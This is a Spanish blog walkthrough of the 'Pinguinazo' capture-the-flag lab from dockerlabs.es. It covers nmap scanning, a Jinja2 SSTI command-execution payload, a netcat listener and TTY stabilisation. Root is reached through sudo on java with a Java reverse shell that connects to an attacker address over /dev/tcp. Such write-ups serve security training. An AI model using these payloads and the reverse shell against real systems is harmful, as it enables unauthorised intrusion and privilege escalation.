---
title: "dockerlabs.es: máquina Pinguinazo"
published: true
date: 2024-05-21 21:10:00
tags: [Kali Linux, Netcat, Privilege Escalation, Pentesting, Cybersecurity, CVE, Exploits, Linux, Reverse Shell, Post Exploitation]
image: /blog/assets/dockerlabs.es_pinguinazo/portada.png
---

<br>
![](/blog/assets/dockerlabs.es_pinguinazo/portada.png)
<br>

### Descripción
* * *
<br>
En esta guía, veremos como podremos vulnerar una máquina realizada en imágenes docker la cual vamos a examinar, a hacer varias reverse shell y además de, conocer un poco acera de las `SSTI (Server Side Template Injection)`


### Enlace de Lab:
[dockerlabs.es: Pinguinazo](https://www.dockerlabs.es/).

### Dificultad:
Fácil.

### Solución
* * *
<br>

Para iniciar el proceso de `vulnerar` esta máquina, lo primero que haremos es con ayuda de `nmap` ver a qué nos estamos enfrentando.



``` shell
nmap -p- -Pn  -sS --min-rate 5000 --open 172.17.0.2 -oX report.xml -v
```
donde:



`-p-`: Escanea todos los puertos existentes (0-65365)


`-Pn`: Evita que `nmap` realice un descubrimiento de host antes de realizar el escaneo


`-sS`: Realiza un escaneo de puertos TCP mediante un escaneo SYN. Esto implica enviar un paquete SYN y esperar una respuesta; si el puerto está abierto, el host responderá con un paquete SYN-ACK

`--min-rate`: Configura la tasa mínima de paquetes enviados a 5000 paquetes por segundo. Esto acelera el escaneo, ya que `nmap` enviará paquetes a una tasa muy alta

`--open`: Esta opción le indica a `nmap` que sólo muestre los puertos que están abiertos.

`-oX`: Guarda la salida del escaneo en un archivo XML llamado `report.xml`








`-v`: Aumenta la verbosidad de la salida de `nmap`, proporcionando más detalles sobre lo que está haciendo `nmap`.








<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_1.JPG)
<br>








Obtenemos 1 puerto abierto, `5000 -> upnp?`  .








Ahora es momento de ver con qué versiones nos estamos enfrentando de cada servicio. Para ello implementamos el código:








```shell
nmap -sCV -p5000 172.17.0.2-oN ports_version
```








Donde:








**`-sC`**: Esta opción le dice a `nmap` que ejecute scripts predeterminados contra los puertos encontrados.


**`-sV`**: Le indica a `nmap` que intente determinar la versión de los servicios que se están ejecutando en los puertos abiertos.








>*sCV es la combinación de ambos comandos*.




<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_2.JPG)
<br>




Nos fijamos que tiene un puerto abierto.








`puerto 5000`: servicio upnp?




Lo primero que haremos es ver los vectores de entrada que tiene el `puerto 5000`, vemos que es una template hecha con `Jinja`










<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_form.png)
<br>




Vemos que es una web con un formulario básico que pide cierta información. Veremos si es vulnerable a `html injection`


escribimos en `PinguNombre` el siguiente comando:




```html
<h1>Canary</h1>
```
Y vemos que es vulnerable


<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_4.JPG)
<br>




Intentamos hacer un `SSTI (Server Side Template Injection)`


```text
{ { 7*7 } } (sin los espacios)
```


<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_5.JPG)
<br>


Y vemos que es vulnerable a este ataque.


Ahora es momento de correr comandos de linux, navegando en internet podemos encontrar varias web que nos ofrecen payloads y comandos ya listos.


En esta página web [^1] encontramos varios `payloads`.




Ejecutar uno para determinar qué usuario somos


```python
{ { request.application.__globals__.__builtins__.__import__('os').popen('id').read() } }
```


<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_6.JPG)
<br>


Ejecutando el comando `id` vemos que pertenecemos al grupo `pinguinazo`


Ya que podemos correr comandos a nivel de sistema, es momento de hacer una `reverse shell` para tener acceso al servidor




Abrimos un puerto en `nc` en modo de escucha con el siguiente comando:


```bash
nc -lvnp 443
```


<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_7.JPG)
<br>


Presionamos el botón `save all` y volvemos a nuestra `nc` en modo escucha, obtendremos lo siguiente:


<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_8.JPG)
<br>


Vemos que somos el usuario `Pinguinazo`, es momento de tratar la bash, más que nada para poder hacer `ctrl+c` sin matar la `reverse shell` y `ctrl+l` para poder limpiar la pantalla:




```bash
script /dev/null -c bash
```

`ctrl+z`


```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```


Si hacemos nano, vi o cat, la pantalla nos aparecerá pequeña y no podremos crear archivos con total libertad. Para ello, corremos lo siguiente:


Abrimos una terminal nueva y corremos:




```bash
stty size
```




<br>
![](/blog/assets/dockerlab.es_upload/bash.png)
<br>
Nos aparecerán dos números, el primero corresponde a las `rows` y el segundo a `columns`.




Abrimos la `reverse shell` y corremos el siguiente código:




```bash
stty rows 24 columns 128
```


Una vez ya tratamos la `tty` es momento de buscar una vía para `escalar privilegios`. Para eso, ejecutamos el comando


```bash
sudo -l
```


<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_9.JPG)
<br>




Vemos que podemos ejecutar como usuario `root` sin necesidad de password el binario de `java`


No hay ninguna forma de escalar con permisos, como el caso de `python`, `ruby` o `php`.


Así que haremos una reverse shell y abrimos otra terminal con `nc` en nuestra máquina local.




Si vamos al a web de `revshell`[^2] y en la sección de `java` copiamos la siguiente:


```java
public class shell {
   public static void main(String[] args) {
       Process p;
       try {
           p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/443 0>&1");
           p.waitFor();
           p.destroy();
       } catch (Exception e) {}
   }
}
```


Con nuestra nueva `nc` en modo escucha




<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_7.JPG)
<br>


Corremos el script de la siguiente forma:




```bash
sudo /usr/bin/java reverse_shell.java
```
<br>
![](/blog/assets/dockerlabs.es_pinguinazo/paso_10.JPG)
<br>


Y vemos que recibimos la conexión como usuario `root` en nuestra máquina.
### _Referencias_
* * *
[^1]: [Jinja2: Template injection](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)


[^2]: [Reverse Shell Generator](https://www.revshells.com/)







